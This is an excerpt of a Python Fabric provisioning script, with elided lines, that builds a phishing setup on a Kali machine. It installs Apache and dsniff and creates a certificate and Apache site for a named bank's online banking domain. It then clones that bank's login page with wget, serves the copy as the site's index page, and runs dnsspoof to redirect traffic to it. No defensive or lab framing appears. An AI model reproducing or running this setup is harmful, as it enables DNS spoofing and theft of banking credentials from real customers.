...
def kali():
    with settings(warn_only=True):
        ...
        sudo('apt-get -y install apache2 dsniff')

        sudo('pip install fabric netifaces python-nmap iptools')        
        ...
        print colored('#####################################', 'blue')
        sudo('sh /vagrant/conf/gen-cer.sh personas.santanderrio.com.ar')
        ...
        sudo('cp /vagrant/www/Apache2/personas.santanderrio.com.ar.conf /etc/apache2/sites-available/personas.santanderrio.com.ar')
        ...
        sudo('mkdir -p /var/www/personas.santanderrio.com.ar/logs')
        ...
        sudo('wget -P /var/www/personas.santanderrio.com.ar/'
             ' --recursive'
             ' --no-clobber'
             ' --page-requisites'
             ' --html-extension'
             ...
             ' --domains website.org'
             ' --no-parent'
             ' https://www.personas.santanderrio.com.ar/hb/html/login/principal.jsp?rndPrm427=1467892790473')
        ...
        sudo('sudo cp /var/www/personas.santanderrio.com.ar/www.personas.santanderrio.com.ar/hb/html/login/principal.jsp@rndPrm427\=1467892790473.html'
        ' /var/www/personas.santanderrio.com.ar/public_html/index.html')
        sudo('rm -r /var/www/personas.santanderrio.com.ar/www.personas.santanderrio.com.ar/')
        ...
        sudo('dnsspoof -i eth1 -f /etc/hosts.spoof > /vagrant/logs/dnsspoof.txt 2>&1 &')
